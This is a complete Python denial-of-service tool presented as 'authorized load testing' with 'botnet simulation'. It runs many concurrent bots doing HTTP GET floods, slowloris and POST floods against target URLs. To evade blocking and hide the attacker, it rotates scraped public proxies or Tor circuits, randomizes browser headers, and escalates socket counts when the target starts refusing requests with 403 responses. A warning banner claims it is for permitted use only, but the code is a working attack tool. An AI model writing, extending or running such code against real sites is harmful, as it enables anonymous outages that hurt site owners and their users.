#!/usr/bin/env python3
import argparse
import asyncio
import logging
import random
import time
import aiohttp
import urllib.parse
from multiprocessing import Manager
import ssl
import warnings
import sys
import os
import uuid
import string
import socket
import socks  # Requires pysocks for Tor SOCKS5 support

# Ethical warning
warnings.warn(
    "This script is for AUTHORIZED load testing ONLY. You MUST have EXPLICIT permission from the target server owner (e.g., vatanak.vercel.app). Unauthorized testing, including botnet-like activities or using Tor to hide IPs, is ILLEGAL and UNETHICAL.",
    UserWarning
)

# Global configurations
DEBUG = False
SSLVERIFY = True
DEFAULT_WORKERS = 100
DEFAULT_SOCKETS = 20  # Reduced for stability
DEFAULT_BOTS = 10
DEFAULT_URL = "https://example.com"
DEFAULT_DURATION = 60
DEFAULT_REQUESTS = 1000
PROXY_API_URL = "https://proxylist.geonode.com/api/proxy-list?limit=200&page={page}&sort_by=lastChecked&sort_type=desc&protocols=https"
FALLBACK_PROXY_API = "https://www.proxy-list.download/api/v1/get?type=https"
ATTACK_TYPES = ['http_flood', 'slowloris', 'post_flood']
MAX_SOCKETS = 100  # Safety limit for auto-attack
FORBIDDEN_THRESHOLD = 0.5
TOR_CONTROL_PORT = 9051  # Default Tor control port
TOR_SOCKS_PORT = 9050  # Default Tor SOCKS5 port (9150 for Tor Browser)

# Modern user agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
]

class ProxyManager:
    def __init__(self, proxy_file="proxies.txt", use_proxy=True, use_tor=False, tor_socks_port=TOR_SOCKS_PORT):
        self.use_proxy = use_proxy
        self.use_tor = use_tor
        self.tor_socks_port = tor_socks_port
        self.proxies = []
        self.current_index = 0
        self.manager = Manager()
        self.valid_proxies = self.manager.list()
        if use_proxy and not use_tor:
            self.load_proxies(proxy_file)
            if not self.valid_proxies:
                logging.info("No proxies loaded from file. Fetching from APIs.")
                asyncio.run(self._fetch_proxies_from_api())

    def load_proxies(self, proxy_file):
        try:
            with open(proxy_file, 'r') as f:
                self.proxies = [f"https://{line.strip()}" for line in f if line.strip() and not line.startswith('#')]
            self.valid_proxies.extend(self.proxies)
            logging.info(f"Loaded {len(self.proxies)} proxies from {proxy_file}")
        except FileNotFoundError:
            logging.warning(f"Proxy file '{proxy_file}' not found. Fetching from APIs.")

    async def _fetch_proxies_from_api(self):
        try:
            async with aiohttp.ClientSession() as session:
                proxies = []
                for page in range(1, 5):
                    url = PROXY_API_URL.format(page=page)
                    logging.debug(f"Fetching proxies from {url}")
                    async with session.get(url, timeout=15) as response:
                        if response.status == 200:
                            data = await response.json()
                            proxies.extend([f"https://{proxy['ip']}:{proxy['port']}" for proxy in data.get('data', [])])
                        else:
                            logging.error(f"Failed to fetch proxies from primary API page {page}: HTTP {response.status}")
                if not proxies:
                    logging.info(f"Primary API failed. Trying fallback API: {FALLBACK_PROXY_API}")
                    async with session.get(FALLBACK_PROXY_API, timeout=15) as response:
                        if response.status == 200:
                            proxy_list = (await response.text()).splitlines()
                            proxies.extend([f"https://{p}" for p in proxy_list if p])
                        else:
                            logging.error(f"Failed to fetch proxies from fallback API: HTTP {response.status}")
                self.proxies = proxies
                self.valid_proxies.extend(proxies)
                logging.info(f"Fetched {len(self.proxies)} HTTPS proxies from APIs")
                if not proxies:
                    logging.warning("No proxies fetched. Disabling proxies.")
                    self.use_proxy = False
        except Exception as e:
            logging.error(f"Error fetching proxies from APIs: {e}")
            self.use_proxy = False

    async def validate_proxy(self, proxy, test_url="https://httpbin.org/ip"):
        for attempt in range(2):
            try:
                async with aiohttp.ClientSession() as session:
                    logging.debug(f"Validating proxy (attempt {attempt+1}): {proxy}")
                    async with session.get(test_url, proxy=proxy, timeout=10, ssl=SSLVERIFY) as response:
                        if response.status == 200:
                            logging.debug(f"Proxy {proxy} is valid")
                            return True
                return False
            except Exception as e:
                logging.debug(f"Proxy {proxy} failed validation (attempt {attempt+1}): {e}")
                if attempt == 1:
                    return False
                await asyncio.sleep(1)

    async def pre_validate_proxies(self):
        if self.use_tor:
            logging.info("Using Tor. Skipping proxy validation.")
            return
        if not self.valid_proxies:
            logging.warning("No proxies to validate.")
            self.use_proxy = False
            return
        valid = []
        tasks = [self.validate_proxy(proxy) for proxy in self.valid_proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for proxy, result in zip(list(self.valid_proxies), results):
            if result is True:
                valid.append(proxy)
        self.valid_proxies[:] = valid
        logging.info(f"Validated {len(valid)} proxies")
        if len(valid) < 10:
            logging.info("Too few valid proxies. Fetching more.")
            await self._fetch_proxies_from_api()
        if not valid:
            logging.warning("No valid proxies available. Disabling proxies.")
            self.use_proxy = False

    def get_proxy(self):
        if self.use_tor:
            return f"socks5://127.0.0.1:{self.tor_socks_port}"
        if not self.use_proxy or not self.valid_proxies:
            return None
        self.current_index = (self.current_index + 1) % len(self.valid_proxies)
        return self.valid_proxies[self.current_index]

    async def refresh_proxies(self):
        if self.use_tor:
            await self.rotate_tor_circuit()
            return
        valid = []
        tasks = [self.validate_proxy(proxy) for proxy in self.valid_proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for proxy, result in zip(list(self.valid_proxies), results):
            if result is True:
                valid.append(proxy)
        if len(valid) < len(self.valid_proxies) / 2:
            logging.info("Too many invalid proxies. Fetching new ones.")
            await self._fetch_proxies_from_api()
        else:
            self.valid_proxies[:] = valid
        logging.info(f"Refreshed {len(valid)} valid proxies")
        if not self.valid_proxies:
            logging.warning("No valid proxies available. Disabling proxies.")
            self.use_proxy = False

    async def rotate_tor_circuit(self):
        try:
            reader, writer = await asyncio.open_connection('127.0.0.1', TOR_CONTROL_PORT)
            writer.write(b'AUTHENTICATE\r\n')
            await writer.drain()
            response = await reader.read(1024)
            if b'250 OK' not in response:
                logging.error("Tor authentication failed")
                return
            writer.write(b'SIGNAL NEWNYM\r\n')
            await writer.drain()
            response = await reader.read(1024)
            if b'250 OK' in response:
                logging.info("Tor circuit rotated successfully")
            else:
                logging.error("Failed to rotate Tor circuit")
            writer.close()
            await writer.wait_closed()
        except Exception as e:
            logging.error(f"Error rotating Tor circuit: {e}")

class Bot:
    def __init__(self, bot_id, urls, duration, sockets, max_threads, request_timeout, endpoints, output_file, verbose, target_requests, attack_type, post_data, auto_attack):
        self.bot_id = bot_id
        self.urls = urls
        self.duration = duration
        self.sockets = sockets
        self.max_threads = max_threads
        self.request_timeout = request_timeout
        self.endpoints = endpoints
        self.output_file = output_file
        self.verbose = verbose
        self.target_requests = target_requests
        self.attack_type = attack_type
        self.post_data = post_data
        self.auto_attack = auto_attack
        self.user_agents = USER_AGENTS
        self.manager = Manager()
        self.stats = {url: self.manager.dict({'success': 0, 'failed': 0, '403': 0, 'status_codes': {}, 'open_connections': 0}) for url in urls}
        self.response_times = {url: self.manager.list() for url in urls}
        self.requests_in_window = {url: self.manager.list() for url in urls}
        self.active_connections = {url: self.manager.Value('i', 0) for url in urls}
        self.current_sockets = self.manager.Value('i', sockets)

    def generate_random_query(self):
        params = {'q': str(random.randint(1, 1000)), 't': str(time.time()), 'bot': self.bot_id}
        return urllib.parse.urlencode(params)

    def generate_random_payload(self, size=1024):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode('utf-8')

    def get_post_data(self):
        if self.post_data:
            return self.post_data.encode('utf-8')
        return self.generate_random_payload()

    async def send_request(self, session, proxy_manager, url):
        accept_options = [
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'application/json,text/plain,*/*',
            '*/*',
        ]
        accept_language_options = [
            'en-US,en;q=0.9',
            'en-GB,en;q=0.8',
            'fr-FR,fr;q=0.9,en;q=0.8',
        ]
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': random.choice(accept_options),
            'Accept-Language': random.choice(accept_language_options),
            'Accept-Encoding': 'gzip, deflate',
            'Referer': random.choice([url, 'https://www.google.com', 'https://' + urllib.parse.urlparse(url).netloc]),
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'DNT': '1',
        }
        proxy = proxy_manager.get_proxy()
        proxy_display = proxy if proxy and not proxy.startswith('socks5') else 'Tor' if proxy else 'none'
        retries = 3 if self.attack_type != 'slowloris' else 1
        endpoint = random.choice(self.endpoints)
        target_url = f"{url.rstrip('/')}{endpoint}?{self.generate_random_query()}"
        logging.debug(f"Bot {self.bot_id} sending {self.attack_type} to {target_url} with proxy {proxy_display}")

        try:
            start_time = time.time()
            if self.attack_type == 'http_flood':
                async with session.get(
                    target_url,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=self.request_timeout),
                    ssl=SSLVERIFY,
                    proxy=proxy
                ) as response:
                    response_time = (time.time() - start_time) * 1000
                    self.stats[url]['success'] += 1
                    self.stats[url]['status_codes'][response.status] = self.stats[url]['status_codes'].get(response.status, 0) + 1
                    if response.status == 403:
                        self.stats[url]['403'] += 1
                        if proxy_manager:
                            logging.debug(f"Bot {self.bot_id} detected 403 with proxy {proxy_display}. Rotating proxies/Tor.")
                            await proxy_manager.refresh_proxies()
                    self.response_times[url].append(response_time)
                    self.requests_in_window[url].append(time.time())
                    if self.verbose:
                        log_message = f"✓ Bot {self.bot_id} Success {response.status} | URL: {url} | Endpoint: {endpoint} | Proxy: {proxy_display} | Time: {response_time:.2f}ms | Attack: {self.attack_type}"
                        print(f"\033[92m{log_message}\033[0m")
                        if self.output_file:
                            with open(self.output_file, 'a', encoding='utf-8') as f:
                                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {log_message}\n")
                    return True

            elif self.attack_type == 'slowloris':
                self.active_connections[url].value += 1
                self.stats[url]['open_connections'] = self.active_connections[url].value
                headers['Connection'] = 'keep-alive'
                async with session.get(
                    target_url,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=None),
                    ssl=SSLVERIFY,
                    proxy=proxy
                ) as response:
                    async for _ in response.content.iter_chunked(1024):
                        await asyncio.sleep(random.uniform(0.5, 2))
                    response_time = (time.time() - start_time) * 1000
                    self.stats[url]['success'] += 1
                    self.stats[url]['status_codes'][response.status] = self.stats[url]['status_codes'].get(response.status, 0) + 1
                    self.response_times[url].append(response_time)
                    self.requests_in_window[url].append(time.time())
                    if self.verbose:
                        log_message = f"✓ Bot {self.bot_id} Success {response.status} | URL: {url} | Endpoint: {endpoint} | Proxy: {proxy_display} | Time: {response_time:.2f}ms | Attack: {self.attack_type}"
                        print(f"\033[92m{log_message}\033[0m")
                        if self.output_file:
                            with open(self.output_file, 'a', encoding='utf-8') as f:
                                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {log_message}\n")
                    return True
                self.active_connections[url].value -= 1

            elif self.attack_type == 'post_flood':
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                async with session.post(
                    target_url,
                    headers=headers,
                    data=self.get_post_data(),
                    timeout=aiohttp.ClientTimeout(total=self.request_timeout),
                    ssl=SSLVERIFY,
                    proxy=proxy
                ) as response:
                    response_time = (time.time() - start_time) * 1000
                    self.stats[url]['success'] += 1
                    self.stats[url]['status_codes'][response.status] = self.stats[url]['status_codes'].get(response.status, 0) + 1
                    if response.status == 403:
                        self.stats[url]['403'] += 1
                        if proxy_manager:
                            logging.debug(f"Bot {self.bot_id} detected 403 with proxy {proxy_display}. Rotating proxies/Tor.")
                            await proxy_manager.refresh_proxies()
                    self.response_times[url].append(response_time)
                    self.requests_in_window[url].append(time.time())
                    if self.verbose:
                        log_message = f"✓ Bot {self.bot_id} Success {response.status} | URL: {url} | Endpoint: {endpoint} | Proxy: {proxy_display} | Time: {response_time:.2f}ms | Attack: {self.attack_type}"
                        print(f"\033[92m{log_message}\033[0m")
                        if self.output_file:
                            with open(self.output_file, 'a', encoding='utf-8') as f:
                                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {log_message}\n")
                    return True

        except aiohttp.ClientError as e:
            logging.error(f"Bot {self.bot_id} attempt failed for {target_url} with proxy {proxy_display}: {e}")
            if self.attack_type != 'slowloris' and retries > 1:
                proxy = proxy_manager.get_proxy()
                await asyncio.sleep(random.uniform(0.5, 1.5))
                return await self.send_request(session, proxy_manager, url)
            self.stats[url]['failed'] += 1
            self.requests_in_window[url].append(time.time())
            if self.attack_type == 'slowloris':
                self.active_connections[url].value -= 1
            if self.verbose:
                log_message = f"✗ Bot {self.bot_id} Error: {e} | URL: {url} | Endpoint: {endpoint} | Proxy: {proxy_display} | Attack: {self.attack_type}"
                print(f"\033[91m{log_message}\033[0m")
                if self.output_file:
                    with open(self.output_file, 'a', encoding='utf-8') as f:
                        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {log_message}\n")
            return False
        except Exception as e:
            logging.error(f"Bot {self.bot_id} unexpected error for {target_url}: {e}")
            self.stats[url]['failed'] += 1
            self.requests_in_window[url].append(time.time())
            if self.attack_type == 'slowloris':
                self.active_connections[url].value -= 1
            return False

    async def display_stats(self, start_time, proxy_manager):
        while time.time() < start_time + self.duration:
            now = time.time()
            output = []
            for url in self.urls:
                self.requests_in_window[url][:] = [t for t in self.requests_in_window[url] if now - t <= 10]
                rps = len(self.requests_in_window[url]) / 10 if self.requests_in_window[url] else 0.0
                avg_response_time = sum(self.response_times[url]) / len(self.response_times[url]) if self.response_times[url] else 0
                elapsed = int(now - start_time)
                remaining = int(self.duration - elapsed)
                proxies = len(proxy_manager.valid_proxies) if proxy_manager and proxy_manager.use_proxy and not proxy_manager.use_tor else 'Tor' if proxy_manager.use_tor else 0
                open_conns = self.stats[url]['open_connections'] if self.attack_type == 'slowloris' else 'N/A'
                current_sockets = self.current_sockets.value
                output.append(
                    f"\r{'='*40} Stats for Bot {self.bot_id} @ {url} {'='*40}\n"
                    f"Attack Type: {self.attack_type}\n"
                    f"⏱  Elapsed: {elapsed}s | Remaining: {remaining}s\n"
                    f"⚡ RPS: {rps:.1f}\n"
                    f"✓ Success: {self.stats[url]['success']} | ✗ Failed: {self.stats[url]['failed']} | 403s: {self.stats[url]['403']}\n"
                    f"📊 Status Codes: {dict(self.stats[url]['status_codes'])}\n"
                    f"⏳ Avg Response Time: {avg_response_time:.1f} ms\n"
                    f"🔗 Proxies: {proxies}\n"
                    f"🔌 Open Connections: {open_conns}\n"
                    f"🔄 Current Sockets: {current_sockets}\n"
                    f"{'='*80}\n"
                )
            sys.stdout.write(f"\033[{len(self.urls)*10}F\033[J")
            sys.stdout.write("".join(output))
            sys.stdout.flush()
            await asyncio.sleep(1)

    def print_custom_stats(self, total_time):
        for url in self.urls:
            total_attack = self.stats[url]['success'] + self.stats[url]['failed']
            print(f"\n✅ Load test completed for Bot {self.bot_id} @ {url}")
            print("=" * 60)
            print(f"Target URL: {url}")
            print(f"Attack Type: {self.attack_type}")
            print(f"Total time: {total_time:.2f} seconds")
            print(f"Successful requests: {self.stats[url]['success']}")
            print(f"Failed requests: {self.stats[url]['failed']}")
            print(f"403 responses: {self.stats[url]['403']}")
            print(f"Total attack: {total_attack}")
            if self.target_requests:
                print(f"Target requests per URL: {self.target_requests}")
                print(f"Completion: {min(100, (total_attack/self.target_requests)*100):.1f}%")
            avg_rps = total_attack / total_time if total_time > 0 else 0
            print(f"Average RPS: {avg_rps:.1f}")
            if self.attack_type == 'slowloris':
                print(f"Max Open Connections: {self.stats[url]['open_connections']}")
            print(f"Final Sockets Used: {self.current_sockets.value}")
            print("=" * 60)

    async def test(self, proxy_manager=None):
        print(f"\n🔶 Bot {self.bot_id} starting {self.attack_type} test on {', '.join(self.urls)}")
        print(f"Duration: {self.duration} seconds")
        print(f"Initial Sockets: {self.sockets}")
        print(f"Threads: {self.max_threads}")
        print(f"Endpoints: {', '.join(self.endpoints)}")
        print(f"Output file: {self.output_file or 'None'}")
        print(f"Verbose: {self.verbose}")
        print(f"Auto-Attack: {self.auto_attack}")
        print(f"Target requests per URL: {self.target_requests}")
        print(f"Using Tor: {proxy_manager.use_tor if proxy_manager else False}")
        print("=" * 60)
        if proxy_manager and (proxy_manager.use_proxy or proxy_manager.use_tor):
            if proxy_manager.use_tor:
                print(f"🔍 Bot {self.bot_id} using Tor on port {proxy_manager.tor_socks_port}")
                await proxy_manager.rotate_tor_circuit()
            else:
                print(f"🔍 Bot {self.bot_id} validating proxies...")
                await proxy_manager.pre_validate_proxies()
                print(f"✅ {len(proxy_manager.valid_proxies)} valid proxies ready")
        else:
            print(f"🔶 Bot {self.bot_id} running without proxies or Tor")
        
        start_time = time.time()
        connector = aiohttp.TCPConnector(limit=50 if self.attack_type == 'slowloris' else 25, limit_per_host=25 if self.attack_type == 'slowloris' else 10)
        session_retries = 3
        for attempt in range(1, session_retries + 1):
            try:
                async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(), connector=connector) as session:
                    stats_task = asyncio.create_task(self.display_stats(start_time, proxy_manager))
                    try:
                        circuit_rotation_interval = random.uniform(10, 30) if proxy_manager.use_tor else float('inf')
                        last_rotation = start_time
                        while time.time() < start_time + self.duration:
                            if proxy_manager.use_tor and time.time() - last_rotation >= circuit_rotation_interval:
                                await proxy_manager.rotate_tor_circuit()
                                last_rotation = time.time()
                                circuit_rotation_interval = random.uniform(10, 30)
                            total_requests = sum(self.stats[url]['success'] + self.stats[url]['failed'] for url in self.urls)
                            if self.target_requests and total_requests >= self.target_requests * len(self.urls):
                                print(f"\n🎯 Bot {self.bot_id} reached target requests!")
                                break
                            if self.auto_attack:
                                for url in self.urls:
                                    total = self.stats[url]['success'] + self.stats[url]['failed']
                                    if total > 0 and self.stats[url]['403'] / total > FORBIDDEN_THRESHOLD:
                                        new_sockets = min(self.current_sockets.value * 2, MAX_SOCKETS)
                                        if new_sockets > self.current_sockets.value:
                                            logging.info(f"Bot {self.bot_id} detected high 403s ({self.stats[url]['403']}/{total}) for {url}. Escalating sockets from {self.current_sockets.value} to {new_sockets}")
                                            self.current_sockets.value = new_sockets
                            tasks = []
                            sockets = self.current_sockets.value * 2 if self.attack_type == 'slowloris' else self.current_sockets.value
                            for url in self.urls:
                                tasks.extend([self.send_request(session, proxy_manager, url) for _ in range(min(sockets, 50 if self.attack_type == 'slowloris' else 25))])
                            await asyncio.gather(*tasks, return_exceptions=True)
                            await asyncio.sleep(random.uniform(0.1, 0.3) if self.attack_type == 'slowloris' else random.uniform(0.2, 0.5))
                            if proxy_manager and (proxy_manager.use_proxy or proxy_manager.use_tor):
                                await proxy_manager.refresh_proxies()
                        stats_task.cancel()
                    except asyncio.CancelledError:
                        logging.warning(f"Bot {self.bot_id} test interrupted, cleaning up...")
                    except Exception as e:
                        logging.error(f"Bot {self.bot_id} test loop error: {e}")
                    finally:
                        await asyncio.sleep(0)
                break
            except Exception as e:
                logging.error(f"Bot {self.bot_id} session initialization attempt {attempt} failed: {e}")
                if attempt < session_retries:
                    await asyncio.sleep(2)
                    continue
                print(f"\n❌ Bot {self.bot_id} failed to initialize session after {session_retries} attempts")
                return
        
        total_time = time.time() - start_time
        self.print_custom_stats(total_time)

def read_urls_from_file(file_path="url.txt"):
    try:
        with open(file_path, 'r') as f:
            urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        valid_urls = []
        for url in urls:
            parsed = urllib.parse.urlparse(url)
            if parsed.scheme in ['http', 'https'] and parsed.netloc:
                valid_urls.append(url)
            else:
                logging.warning(f"Invalid URL in {file_path}: {url}. Skipping.")
                print(f"❌ Invalid URL in {file_path}: {url}. Please include http:// or https:// and a valid domain.")
        if not valid_urls:
            print(f"❌ No valid URLs found in {file_path}.")
            return []
        return valid_urls
    except FileNotFoundError:
        print(f"❌ {file_path} not found. Please provide valid URLs.")
        return []

def read_post_data_from_file(file_path="post_data.txt"):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            data = f.read().strip()
        if data:
            return data
        print(f"❌ {file_path} is empty. Using random payload.")
        return None
    except FileNotFoundError:
        print(f"❌ {file_path} not found. Using random payload.")
        return None

def prompt_for_url():
    while True:
        print("Choose URL input method:")
        print("1. Read multiple URLs from url.txt")
        print("2. Enter a single URL manually")
        choice = input("Enter 1 or 2 (press Enter for default [url.txt]): ").strip()
        if not choice or choice == "1":
            urls = read_urls_from_file()
            if urls:
                return urls
            print("Falling back to manual input.")
            choice = "2"
        if choice == "2":
            url = input(f"Please enter a target URL (e.g., {DEFAULT_URL}, press Enter for default): ").strip()
            if not url:
                return [DEFAULT_URL]
            parsed = urllib.parse.urlparse(url)
            if parsed.scheme in ['http', 'https'] and parsed.netloc:
                return [url]
            print(f"❌ Error: Invalid URL format for {url}. Please include http:// or https://")
        else:
            print("❌ Invalid choice. Please enter 1 or 2.")

def prompt_for_endpoints():
    endpoints = input("Enter endpoints to test (comma-separated, e.g., /api,/search, press Enter for default [/]): ").strip()
    if not endpoints:
        return ['/']
    return [e.strip() for e in endpoints.split(',')]

def prompt_for_duration():
    while True:
        try:
            duration_input = input(f"Please enter the test duration in seconds (default: {DEFAULT_DURATION}): ").strip()
            if not duration_input:
                return DEFAULT_DURATION
            duration = int(duration_input)
            if duration <= 0:
                print("❌ Duration must be positive.")
                continue
            return duration
        except ValueError:
            print("❌ Error: Please enter a valid positive integer for duration.")

def prompt_for_target_requests():
    while True:
        try:
            target_input = input(f"Enter target number of requests per URL (default: {DEFAULT_REQUESTS}): ").strip()
            if not target_input:
                return DEFAULT_REQUESTS
            target = int(target_input)
            if target <= 0:
                print("❌ Target must be positive.")
                continue
            return target
        except ValueError:
            print("❌ Error: Please enter a valid positive integer for target requests.")

def prompt_for_output_file():
    output_file = input("Enter output file name to save logs (press Enter for no file): ").strip()
    return output_file if output_file else None

def prompt_for_verbose():
    verbose = input("Enable verbose per-request logging? (y/n, default: n): ").strip().lower()
    return verbose == 'y'

def prompt_for_bots():
    while True:
        try:
            bots_input = input(f"Enter number of simulated bots (default: {DEFAULT_BOTS}): ").strip()
            if not bots_input:
                return DEFAULT_BOTS
            bots = int(bots_input)
            if bots <= 0:
                print("❌ Number of bots must be positive.")
                continue
            return bots
        except ValueError:
            print("❌ Error: Please enter a valid positive integer for number of bots.")

def prompt_for_attack_type():
    while True:
        print("Choose attack type:")
        print("1. http_flood (High-volume GET requests)")
        print("2. slowloris (Slow HTTP requests to exhaust connections)")
        print("3. post_flood (POST requests with custom or random payloads)")
        choice = input("Enter 1, 2, or 3 (press Enter for default [http_flood]): ").strip()
        if not choice or choice == "1":
            return 'http_flood'
        elif choice == "2":
            return 'slowloris'
        elif choice == "3":
            return 'post_flood'
        else:
            print("❌ Invalid choice. Please enter 1, 2, or 3.")

def prompt_for_post_data():
    print("For post_flood, provide POST data:")
    print("1. Read from post_data.txt")
    print("2. Enter data manually")
    print("3. Use random payload")
    choice = input("Enter 1, 2, or 3 (press Enter for default [random]): ").strip()
    if not choice or choice == "3":
        return None
    if choice == "1":
        return read_post_data_from_file()
    if choice == "2":
        data = input("Enter POST data (e.g., key=value&key2=value2): ").strip()
        return data if data else None
    print("❌ Invalid choice. Using random payload.")
    return None

def prompt_for_auto_attack():
    auto = input("Enable auto-attack escalation on 403 responses? (y/n, default: n): ").strip().lower()
    return auto == 'y'

def prompt_for_proxy_type():
    while True:
        print("Choose proxy type:")
        print("1. Use HTTPS proxies (--useproxy)")
        print("2. Use Tor (--usetor)")
        print("3. No proxies or Tor (--no-useproxy)")
        choice = input("Enter 1, 2, or 3 (press Enter for default [no proxies]): ").strip()
        if not choice or choice == "3":
            return False, False
        if choice == "1":
            return True, False
        if choice == "2":
            return False, True
        print("❌ Invalid choice. Please enter 1, 2, or 3.")

async def main():
    parser = argparse.ArgumentParser(
        description="HTTP Load Testing Tool with Botnet Simulation for Authorized Use (Educational Use Only). Supports Tor for IP anonymization.",
        epilog="Examples:\n"
               "  python v4.py https://example.com --bots 5 --usetor --attack slowloris --auto-attack --output results.txt --verbose\n"
               "  python v4.py --url-file url.txt --useproxy --attack post_flood --post-data 'key=value' --target 1000 --output results.txt\n"
               "  python v4.py  # Interactive mode",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("url", nargs='?', help="Single target URL (e.g., https://example.com)")
    parser.add_argument("--url-file", help="File containing multiple target URLs (e.g., url.txt)")
    parser.add_argument("-s", "--sockets", type=int, default=DEFAULT_SOCKETS, help=f"Number of sockets per bot per cycle (default: {DEFAULT_SOCKETS})")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Request timeout in seconds (default: 5, ignored for Slowloris)")
    parser.add_argument("--duration", type=int, default=DEFAULT_DURATION, help=f"Duration for test (default: {DEFAULT_DURATION})")
    parser.add_argument("--target", type=int, default=DEFAULT_REQUESTS, help=f"Target number of requests per URL (default: {DEFAULT_REQUESTS})")
    parser.add_argument("--bots", type=int, default=DEFAULT_BOTS, help=f"Number of simulated bots (default: {DEFAULT_BOTS})")
    parser.add_argument("--useproxy", action="store_true", help="Use HTTPS proxies with auto-rotation")
    parser.add_argument("--usetor", action="store_true", help="Use Tor for IP anonymization")
    parser.add_argument("--no-useproxy", action="store_false", dest="useproxy", help="Disable proxies and Tor")
    parser.add_argument("--proxy-file", default="proxies.txt", help="File containing proxies (default: proxies.txt)")
    parser.add_argument("--tor-port", type=int, default=TOR_SOCKS_PORT, help=f"Tor SOCKS5 port (default: {TOR_SOCKS_PORT})")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode (disables SSL verification)")
    parser.add_argument("--endpoints", help="Comma-separated list of endpoints (e.g., /api,/search)")
    parser.add_argument("--output", help="File to save output (e.g., results.txt)")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose per-request logging")
    parser.add_argument("--attack", choices=ATTACK_TYPES, default='http_flood', help="Attack type: http_flood, slowloris, or post_flood (default: http_flood)")
    parser.add_argument("--post-data", help="POST data for post_flood (overrides post_data.txt)")
    parser.add_argument("--auto-attack", action="store_true", help="Escalate sockets on 403 responses")
    args = parser.parse_args()

    global DEBUG, SSLVERIFY
    DEBUG = args.debug or DEBUG
    SSLVERIFY = not args.debug
    logging.basicConfig(
        format="[%(asctime)s] %(levelname)s: %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.DEBUG if DEBUG else logging.INFO
    )

    # Proxy/Tor logic
    use_proxy = args.useproxy
    use_tor = args.usetor
    if not args.useproxy and not args.usetor:
        use_proxy, use_tor = prompt_for_proxy_type()

    # URL selection logic
    if args.url_file:
        urls = read_urls_from_file(args.url_file)
        if not urls:
            print("❌ Failed to read valid URLs from file. Exiting.")
            return
    elif args.url:
        parsed = urllib.parse.urlparse(args.url)
        if parsed.scheme in ['http', 'https'] and parsed.netloc:
            urls = [args.url]
        else:
            print(f"❌ Invalid URL format for {args.url}. Exiting.")
            return
    else:
        urls = prompt_for_url()
        if not urls:
            print("❌ No valid URLs provided. Exiting.")
            return
    
    endpoints = args.endpoints.split(',') if args.endpoints else prompt_for_endpoints()
    output_file = args.output if args.output else prompt_for_output_file()
    verbose = args.verbose or prompt_for_verbose()
    target_requests = args.target if args.target else prompt_for_target_requests()
    num_bots = args.bots if args.bots else prompt_for_bots()
    attack_type = args.attack if args.attack else prompt_for_attack_type()
    auto_attack = args.auto_attack or prompt_for_auto_attack()
    post_data = args.post_data
    if attack_type == 'post_flood' and not post_data:
        post_data = read_post_data_from_file() or prompt_for_post_data()

    proxy_manager = ProxyManager(proxy_file=args.proxy_file, use_proxy=use_proxy, use_tor=use_tor, tor_socks_port=args.tor_port)

    # Create bot instances
    bots = [
        Bot(
            bot_id=str(uuid.uuid4())[:8],
            urls=urls,
            duration=args.duration,
            sockets=args.sockets,
            max_threads=DEFAULT_WORKERS,
            request_timeout=args.timeout,
            endpoints=endpoints,
            output_file=output_file,
            verbose=verbose,
            target_requests=target_requests,
            attack_type=attack_type,
            post_data=post_data,
            auto_attack=auto_attack
        ) for _ in range(num_bots)
    ]

    if not bots:
        print("❌ No bots created. Exiting.")
        return

    try:
        tasks = [bot.test(proxy_manager) for bot in bots]
        await asyncio.gather(*tasks, return_exceptions=True)
    except Exception as e:
        print(f"❌ Unexpected error during botnet simulation: {e}")
        logging.error(f"Main execution error: {e}")

if __name__ == "__main__":
    asyncio.run(main())